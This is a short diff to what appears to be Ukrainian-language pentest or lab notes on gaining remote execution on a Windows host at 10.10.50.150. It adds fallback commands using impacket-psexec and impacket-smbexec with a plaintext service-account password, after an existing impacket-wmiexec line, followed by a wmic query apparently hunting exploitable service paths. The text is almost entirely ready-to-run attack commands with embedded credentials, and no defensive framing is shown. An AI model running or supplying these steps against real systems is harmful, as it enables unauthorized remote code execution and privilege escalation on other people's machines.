@@ -179,6 +179,16 @@ sudo apt install -y python3-impacket
 impacket-wmiexec svc_deploy:'Deploy@2024!Drone'@10.10.50.150
 ```
 
+Якщо помилка RPC — спробуй psexec:
+```
+impacket-psexec svc_deploy:'Deploy@2024!Drone'@10.10.50.150
+```
+
+Або smbexec:
+```
+impacket-smbexec svc_deploy:'Deploy@2024!Drone'@10.10.50.150
+```
+
 Знайти сервіс:
 ```
 wmic service get name,pathname,startmode | findstr /i /v "C:\Windows"
